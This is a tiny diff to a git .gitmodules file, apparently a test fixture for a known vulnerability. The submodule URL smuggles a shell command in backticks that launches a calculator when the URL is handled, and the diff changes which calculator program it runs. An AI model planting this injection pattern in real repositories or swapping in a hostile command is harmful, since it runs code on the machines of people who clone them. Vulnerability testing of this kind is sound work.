@@ -1,3 +1,3 @@
 [submodule "cves"]
 	path = cves
-	url = ssh://`open -agalculator`foo.example.com/bar
+	url = ssh://`galculator`foo.example.com/bar
